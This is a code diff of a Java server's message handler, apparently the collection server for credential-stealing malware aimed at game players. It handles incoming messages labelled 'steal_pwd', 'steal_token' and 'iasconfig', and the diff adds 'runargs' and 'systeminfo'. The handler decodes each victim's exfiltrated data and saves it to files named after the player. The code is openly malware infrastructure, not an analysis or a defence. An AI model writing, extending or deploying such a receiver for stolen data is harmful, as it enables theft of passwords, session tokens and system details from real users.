@@ -59,9 +59,10 @@ public class MessageHandler {
                     Server.clientMap.replace(conn, new Gson().fromJson(playerInfo, Client.class));
                     log("Message: " + msgArr[0] + " " + playerInfo);
                 }
-                case "steal_pwd", "steal_token", "iasconfig" -> {
-                    File file = new File("player", getFileName(msgArr[0], "json", Server.clientMap.get(conn).playerName, true));
-                    new File("player").mkdir();
+                case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo" -> {
+                    String ext = msgArr[0].equals("systeminfo") ? "txt" : "json";
+                    File file = new File("data", getFileName(msgArr[0], "json", Server.clientMap.get(conn).playerName, true));
+                    new File("data").mkdir();
                     file.createNewFile();
                     FileOutputStream out = new FileOutputStream(file);
                     out.write(decodeBase64(msgArr[1]).getBytes(StandardCharsets.UTF_8));
